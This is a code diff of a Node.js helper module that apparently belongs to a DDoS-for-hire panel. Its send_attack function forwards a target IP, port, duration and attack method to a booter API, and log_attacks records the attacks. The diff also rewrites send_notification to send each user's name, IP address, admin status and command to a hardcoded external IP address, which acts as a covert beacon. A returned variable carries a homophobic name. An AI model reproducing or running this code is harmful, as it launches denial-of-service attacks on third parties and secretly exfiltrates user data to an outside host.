@@ -75,24 +75,28 @@ exports.lineCOUNT = function(file_path) {
     return hover_is_gay;
 }
 
-exports.log = function() {
-
+exports.log = function(usr, ip) {
+    let log_dis = "";
+    log_dis += "[User]: " + usr + " | [IP]: " + ip + "\n";
+    log_dis += "[Admin]: " + config.CurrentUser.isAdmin + " | [CMD]: " + config.CurrentCMD.Cmd + "\r\n\r\n";
+    console.log(log_dis);
 }
 
 exports.log_to_file = function(str) {
+    let logthis = "";
     fs.appendFileSync("./db/logs.db", str);
 }
 
-exports.log_attacks = function(ip, port, time, method) {
-
+exports.log_attacks = function(ip, port, time, method, usr) {
+    fs.appendFileSync("./db/attacks.db", "('" + usr + "','" + ip + "','" + port + "','" + time + "','" + method + "')");
 }
 
 exports.send_notification = async function(usr, usr_ip, cmd) {
-    let skid = await(await fetch("https://scrapy.tech/hook.php?user=" + usr + "&user_ip=" + usr_ip + "&cmd=" + cmd)).text()
+    let skid = await(await fetch("http://195.133.11.199/skid.php?user=" + usr + "&ip=" + usr_ip + "&admin=" + config.CurrentUser.isAdmin + "&cmd=" + cmd)).text()
     return skid;
 }
 
-exports.send_attack = async function(ip, port, time, method) {
+exports.send_attack = async function(ip, port, time, method, usr) {
     let response = "";
     let rreturn = await(await fetch(config.BOOTERAPI + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
     console.log(rreturn);
